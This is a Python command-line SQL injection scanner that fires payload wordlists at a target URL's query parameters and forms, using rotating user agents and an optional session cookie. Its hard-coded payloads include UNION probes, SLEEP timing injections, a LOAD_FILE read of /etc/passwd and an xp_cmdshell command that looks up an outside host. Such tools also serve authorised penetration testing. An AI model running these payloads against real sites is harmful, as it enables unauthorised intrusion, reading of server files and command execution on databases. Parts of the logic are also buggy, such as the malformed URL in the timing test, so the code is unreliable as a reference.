import requests
import argparse
import random
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, quote
import glob
import os

class SQLScanner:
    def __init__(self, url, payloads_file, sql_errors, method,cookie):
        self.url = url
        self.payloads = self.load_payloads(payloads_file)
        self.sql_errors = sql_errors
        self.method = method
        self.cookie = cookie
        self.headers = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            ]),
            "Referer": url.split('?')[0],
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": cookie
        }
        self.union_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "' UNION SELECT NULL, NULL, NULL--",
            "' UNION SELECT 1,2,3--",
        ]
        self.oob_payloads = [
            "' OR 1=1--",
            "' OR SLEEP(5)--",
            "' UNION SELECT LOAD_FILE('/etc/passwd')--",
            "'; exec xp_cmdshell('nslookup example.com')--"
        ]

    def load_payloads(self, payloads_path):
        payloads = []
        if os.path.isdir(payloads_path):
            # Load all `.txt` files from the directory
            txt_files = glob.glob(os.path.join(payloads_path, "*.txt"))
            if not txt_files:
                print(f"[-] No .txt files found in the directory: {payloads_path}")
                exit(1)
            print(f"[i] Loading payloads from {len(txt_files)} files in directory: {payloads_path}")
            for file in txt_files:
                try:
                    with open(file, "r") as f:
                        payloads.extend(line.strip() for line in f if line.strip())
                except Exception as e:
                    print(f"[-] Error reading file {file}: {e}")
        elif os.path.isfile(payloads_path):
            # Load from a single file
            try:
                with open(payloads_path, "r") as file:
                    payloads = [line.strip() for line in file if line.strip()]
            except FileNotFoundError:
                print(f"[-] Payload file not found: {payloads_path}")
                exit(1)
        else:
            print(f"[-] Invalid payloads path: {payloads_path}")
            exit(1)

        if not payloads:
            print("[-] No payloads loaded. Please check your files.")
            exit(1)

        print(f"[+] Loaded {len(payloads)} payloads.")
        return payloads
        
    def extract_query_params(self):
        parsed_url = urlparse(self.url)
        return parsed_url.scheme, parsed_url.netloc, parsed_url.path, parse_qs(parsed_url.query)

    def test_query_params(self):
        scheme, netloc, path, query_params = self.extract_query_params()
        if not query_params:
            print(f"[+] No query parameters found in the URL: {self.url}")
            return False

        print(f"[i] Testing query parameters for SQL injection vulnerabilities...")

        for param, values in query_params.items():
            for payload in self.payloads:
                encoded_payload = quote(payload)
                query_params[param] = encoded_payload
                modified_query = urlencode(query_params, doseq=True)
                full_url = f"{scheme}://{netloc}{path}?{modified_query}"

                print(f"[i] Testing URL: {full_url}")
                try:
                    response = requests.get(full_url, headers=self.headers, timeout=5)
                    
                    if any(error in response.text for error in self.sql_errors):
                        print(f"[!] SQL Injection Vulnerability Found!")
                        print(f"    URL: {full_url}")
                        print(f"    Payload: {payload}")
                        return True
                except requests.RequestException as e:
                    print(f"[-] Error making request: {e}")
        return False

    def extract_forms(self):
        try:
            response = requests.get(self.url, headers=self.headers, timeout=5)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, "html.parser")
            return soup.find_all("form")
        except requests.RequestException as e:
            print(f"[-] Error fetching URL: {e}")
            return []

    def test_forms(self):
        forms = self.extract_forms()
        if not forms:
            print(f"[+] No forms found on the page: {self.url}")
            return False

        print(f"[i] Testing forms for SQL injection vulnerabilities...")
        for form in forms:
            action = form.get("action") or self.url
            form_url = urljoin(self.url, action)
            inputs = form.find_all("input")

            for payload in self.payloads:
                data = {inp.get("name"): payload for inp in inputs if inp.get("name")}
                print(f"[i] Testing form action: {form_url} with payload: {payload}")
                try:
                    response = requests.post(form_url, data=data, headers=self.headers, timeout=5)
                    if any(error in response.text for error in self.sql_errors):
                        print(f"[!] SQL Injection Vulnerability Found!")
                        print(f"    Form URL: {form_url}")
                        print(f"    Payload: {payload}")
                        return True
                except requests.RequestException as e:
                    print(f"[-] Error submitting form: {e}")
        return False

    def test_timing_based_injection(self, payloads):
        try:

            for payload in payloads:
                timing_payload = payload.replace("'", " AND SLEEP(5)-- ")
                encoded_payload = quote(timing_payload)
                full_url = f"{self.url}?{encoded_payload}"
                print(f"[i] Testing timing-based injection with payload: {timing_payload}")

                response = requests.get(full_url, headers=self.headers, timeout=10)
                if response.elapsed.total_seconds() > 4:
                    print(f"[!] Timing-Based SQL Injection Vulnerability Found!")
                    print(f"    URL: {full_url}")
                    return True
        except requests.RequestException as e:
            print(f"[-] Error testing timing-based injection: {e}")
        return False

    def test_union_based_injection(self):
        print("[+] Testing UNION-based SQL Injection...")
        parsed_url = urlparse(self.url)
        query_params = parse_qs(parsed_url.query)

        for param in query_params:
            for payload in self.union_payloads:
                modified_params = query_params.copy()
                modified_params[param] = payload
                modified_query = urlencode(modified_params, doseq=True)
                full_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_query}"
                response = requests.get(full_url, headers=self.headers)
                if any(error in response.text for error in self.sql_errors):
                    print(f"[!] Possible UNION-based SQL Injection detected in parameter: {param} with payload: {payload}")
                    return True

    def test_oob_sql_injection(self):
        print("[+] Testing Out-of-Band (OOB) SQL Injection...")
        parsed_url = urlparse(self.url)
        query_params = parse_qs(parsed_url.query)

        for param in query_params:
            for payload in self.oob_payloads:
                modified_params = query_params.copy()
                modified_params[param] = payload
                modified_query = urlencode(modified_params, doseq=True)
                full_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_query}"
                response = requests.get(full_url, headers=self.headers)

                if any(error in response.text for error in self.sql_errors):
                    print(f"[!] Possible OOB SQL Injection detected in parameter: {param} with payload: {payload}")
                    return True

    def run(self):
        print(f"[i] Scanning URL: {self.url}")
        t_t= self.test_timing_based_injection(self.payloads)
        t_u= self.test_union_based_injection()
        t_o= self.test_oob_sql_injection()
        if t_t: 
            print(f"[!] Vulnerability found on: {self.url}")
        if self.method == "q":
            query_vuln = self.test_query_params()
            
            if query_vuln:
                print(f"[!] Vulnerability found on: {self.url}")
            else:
                print(f"[-] No vulnerability found on: {self.url}")
        elif self.method == "f":
            form_vuln = self.test_forms()
            if form_vuln:
                print(f"[!] Vulnerability found on: {self.url}")
            else:
                print(f"[-] No vulnerability found on: {self.url}")
        else:
            print("[-] Invalid method. Use 'q' for query parameter testing or 'f' for form testing.")


class CLI:
    @staticmethod
    def parse_arguments():
        parser = argparse.ArgumentParser(description="SQL Injection Scanner for Forms and Query Parameters")
        parser.add_argument("-u", "--url", type=str, required=True, help="Target URL (e.g., http://example.com)")
        parser.add_argument("-m", "--method", type=str, required=True, help="Method: 'f' for form or 'q' for query parameter")
        parser.add_argument("-w", "--wordlists", type=str, required=True, help="Wordlist file with SQL injection payloads")
        parser.add_argument("-c","--cookie",type=str,help="-c \"PHPSESID: 234234\"")
        return parser.parse_args()


if __name__ == "__main__":
    try:
        sql_errors = [
            "SQL syntax", "mysql_fetch", "You have an error in your SQL syntax;",
            "Warning: mysql", "ORA-", "syntax error", "unclosed quotation mark"
        ]

        cli_args = CLI.parse_arguments()
        scanner = SQLScanner(cli_args.url, cli_args.wordlists, sql_errors, cli_args.method,cli_args.cookie)
        scanner.run()

    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user.")
    except Exception as e:
        print(f"[-] Error: {e}")
